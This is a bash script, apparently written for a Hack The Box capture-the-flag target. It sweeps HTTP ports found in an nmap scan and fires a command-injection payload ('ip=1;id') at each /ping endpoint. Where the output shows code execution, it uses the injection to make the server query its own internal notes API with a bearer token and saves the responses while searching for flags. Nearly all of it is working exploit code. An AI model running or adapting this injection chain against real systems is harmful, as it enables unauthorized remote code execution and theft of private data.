#!/usr/bin/env bash
set -euo pipefail
IP=${1:?IP}
NMAP_FILE=${2:?NMAP_FILE}
PRIMARY_PORT=${3:-30497}
TO=${4:-8}
OUT_DIR=${5:-/workspace/recon/httpx}
mkdir -p "$OUT_DIR/${IP}_sweep"
TOKEN_FILE="/workspace/recon/httpx/${IP}_${PRIMARY_PORT}/token.txt"
TOKEN=""
if [[ -s "$TOKEN_FILE" ]]; then TOKEN=$(cat "$TOKEN_FILE"); fi
# Extract likely HTTP ports
PORTS=$(awk '/\/tcp\s+open\s+.*http/{print $1}' "$NMAP_FILE" | cut -d/ -f1 | sort -n | uniq)
for p in $PORTS; do
  BASE="http://$IP:$p"
  # GET /ping
  curl -fsS -m "$TO" --connect-timeout "$TO" -i "$BASE/ping" > "$OUT_DIR/${IP}_sweep/${p}_ping.head" 2>/dev/null || true
  # POST benign
  curl -fsS -m "$TO" --connect-timeout "$TO" -s -X POST --data-urlencode 'ip=127.0.0.1' "$BASE/ping" > "$OUT_DIR/${IP}_sweep/${p}_ping_post.txt" 2>/dev/null || true
  # POST injection
  RES=$(curl -fsS -m "$TO" --connect-timeout "$TO" -s -X POST --data-urlencode 'ip=1;id' "$BASE/ping" || true)
  echo "$RES" | head -n 3 > "$OUT_DIR/${IP}_sweep/${p}_ping_inj.txt"
  if echo "$RES" | grep -qiE 'uid=|www-data|linux'; then
    echo "RCE:$p" | tee -a "$OUT_DIR/${IP}_sweep/rce_ports.txt"
    if [[ -n "$TOKEN" ]]; then
      printf "ip=1;curl -s -H 'Authorization: Bearer %s' http://127.0.0.1:%s/api/notes/all" "$TOKEN" "$PRIMARY_PORT" > "/workspace/recon/tmp/inj_${p}_all.txt"
      curl -fsS -m "$TO" --connect-timeout "$TO" -s -X POST --data-urlencode "ip@/workspace/recon/tmp/inj_${p}_all.txt" "$BASE/ping" > "$OUT_DIR/${IP}_sweep/${p}_localhost_all.json" || true
      printf "ip=1;curl -s -H 'Authorization: Bearer %s' 'http://127.0.0.1:%s/api/notes?all=1'" "$TOKEN" "$PRIMARY_PORT" > "/workspace/recon/tmp/inj_${p}_list.txt"
      curl -fsS -m "$TO" --connect-timeout "$TO" -s -X POST --data-urlencode "ip@/workspace/recon/tmp/inj_${p}_list.txt" "$BASE/ping" > "$OUT_DIR/${IP}_sweep/${p}_localhost_list.json" || true
    fi
  fi
done
# Search for HTB flags
rg -n "HTB\{[^}]+\}" -S "$OUT_DIR/${IP}_sweep" | tee "$OUT_DIR/${IP}_sweep/htb_hits.txt" || true
sed -n '1,160p' "$OUT_DIR/${IP}_sweep/htb_hits.txt" || true
